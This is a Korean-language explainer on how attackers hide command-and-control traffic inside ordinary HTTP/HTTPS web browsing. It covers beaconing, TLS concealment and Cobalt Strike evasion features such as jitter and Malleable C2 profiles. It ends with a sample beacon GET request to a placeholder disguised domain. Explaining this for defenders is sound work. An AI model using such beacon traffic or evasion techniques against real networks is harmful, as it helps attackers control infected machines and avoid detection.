평범한 웹 서핑으로 위장한 비밀 통신 — HTTP/HTTPS C2

#1. C2(명령제어)란? 웹 프로토콜 악용 이유

🌐 ➜ 📡 ➜ 🎭 ➜ 💀

"평범한 웹 서핑으로 위장한 비밀 통신"

여러분이 매일 하는 웹 서핑 — 뉴스 읽기, 쇼핑, SNS 확인 — 이 모든 것이 HTTP/HTTPS 프로토콜을 사용합니다. 해커는 이 일상적인 트래픽 속에 악성 명령을 숨겨 보안 장비의 눈을 피합니다. 마치 수천 통의 편지 속에 비밀 암호문 한 장을 끼워 넣는 것과 같습니다.

왜 웹 프로토콜인가?

방화벽은 대부분 80(HTTP)과 443(HTTPS) 포트를 허용합니다. 이 포트를 차단하면 직원들이 인터넷을 사용할 수 없기 때문입니다. 해커는 이 "항상 열려 있는 문"을 이용해 감염된 PC에 명령을 내리고 결과를 회수합니다.

🚪
항상 열린 포트
80/443 포트는 거의 모든 네트워크에서 허용
🎭
정상 트래픽 위장
수많은 웹 트래픽 속에 C2 통신 은닉
🔒
HTTPS 암호화
TLS 암호화로 페이로드 내용 은닉

#2. HTTP Beacon, HTTPS 채널, Cobalt Strike

HTTP Beacon

감염된 PC가 일정 간격(예: 60초)으로 C2 서버에 HTTP GET 요청을 보냅니다. 마치 직원이 주기적으로 이메일을 확인하듯, 악성코드도 "새 명령이 있나요?"라고 주기적으로 물어봅니다. 이를 Beacon(비콘)이라 합니다.

HTTPS 암호화 채널

HTTPS를 사용하면 TLS 암호화로 패킷 내용을 볼 수 없습니다. 방화벽은 "어디로 가는지"는 알지만 "무엇을 보내는지"는 모릅니다. 해커는 이를 악용해 명령과 탈취 데이터를 안전하게 전송합니다.

실전 도구: Cobalt Strike

Cobalt Strike는 합법적 침투 테스트 도구이지만, 공격자들이 가장 많이 악용하는 C2 프레임워크입니다. Beacon 주기 랜덤화(Jitter), SSL 인증서 위장, 정상 웹사이트 프로필 모방(Malleable C2 Profile) 등 고급 회피 기술을 제공합니다.

# Cobalt Strike Beacon 통신 예시
GET /api/v1/updates?id=a3f2c HTTP/1.1
Host: cdn-static.legit-site.com
User-Agent: Mozilla/5.0 (Windows NT 10.0)
# 정상적인 API 호출처럼 보이지만 실제로는 C2 명령 수신
